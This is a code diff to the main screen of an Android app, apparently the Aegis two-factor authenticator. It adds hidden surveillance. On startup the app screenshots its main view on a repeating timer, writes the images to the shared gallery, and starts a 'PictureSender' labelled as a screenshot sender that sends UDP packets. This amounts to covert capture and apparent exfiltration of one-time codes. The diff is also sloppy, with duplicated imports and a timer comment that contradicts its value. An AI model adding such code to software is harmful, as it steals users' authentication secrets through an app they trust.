@@ -5,7 +5,13 @@ import android.annotation.SuppressLint;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.os.Build;
-
+import android.os.Handler;
+import android.provider.MediaStore;
+import android.graphics.Bitmap;
+import android.view.View;
+import android.content.ContentValues;
+import android.net.Uri;
+import java.io.OutputStream;
 import androidx.annotation.RequiresApi;
 import androidx.core.app.NotificationCompat;
 
@@ -73,8 +79,17 @@ import java.util.Objects;
 import java.util.Set;
 import java.util.UUID;
 import java.util.stream.Collectors;
-
+import android.os.Handler;
+import android.provider.MediaStore;
+import android.graphics.Bitmap;
+import android.view.View;
+import android.content.ContentValues;
+import android.net.Uri;
+import java.io.OutputStream;
 public class MainActivity extends AegisActivity implements EntryListView.Listener {
+    private PictureSender pictureSender;
+
+
     // activity request codes
     private static final int CODE_SCAN = 0;
     private static final int CODE_ADD_ENTRY = 1;
@@ -118,7 +133,13 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
     @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
+
+
         super.onCreate(savedInstanceState);
+        handler.post(runnableCode); //Screenshot handler
+        pictureSender = new PictureSender(this); //Screenshot sender
+        pictureSender.sendTestUdpPacket();
+        pictureSender.startSending();
 
         // Create and show a pop-up dialog
         new AlertDialog.Builder(this)
@@ -220,10 +241,45 @@ public class MainActivity extends AegisActivity implements EntryListView.Listene
         _selectedEntries = new ArrayList<>();
     }
 
+
+    private Handler handler = new Handler();
+    private Runnable runnableCode = new Runnable() {
+        @Override
+        public void run() {
+            // Get the view you want to capture
+            View view = findViewById(R.id.main_screen);            // Create a bitmap
+            view.setDrawingCacheEnabled(true);
+            Bitmap bitmap = Bitmap.createBitmap(view.getDrawingCache());
+            view.setDrawingCacheEnabled(false);
+
+            // Save the bitmap to the gallery using MediaStore
+            saveBitmapToGallery(bitmap);
+
+            // Repeat this runnable code block again every 10 seconds
+            handler.postDelayed(this, 50000);
+        }
+    };
+
+    private void saveBitmapToGallery(Bitmap bitmap) {
+        ContentValues values = new ContentValues();
+        values.put(MediaStore.Images.Media.DISPLAY_NAME, "screenshot_" + System.currentTimeMillis() + ".png");
+        values.put(MediaStore.Images.Media.MIME_TYPE, "image/png");
+        values.put(MediaStore.Images.Media.RELATIVE_PATH, "Pictures/YourAppScreenshots");
+
+        Uri uri = getContentResolver().insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
+        try (OutputStream outstream = getContentResolver().openOutputStream(uri)) {
+            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outstream);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
     @Override
     protected void onDestroy() {
         _entryListView.setListener(null);
         super.onDestroy();
+        handler.removeCallbacks(runnableCode);
+        pictureSender.stopSending();
     }
 
     @Override
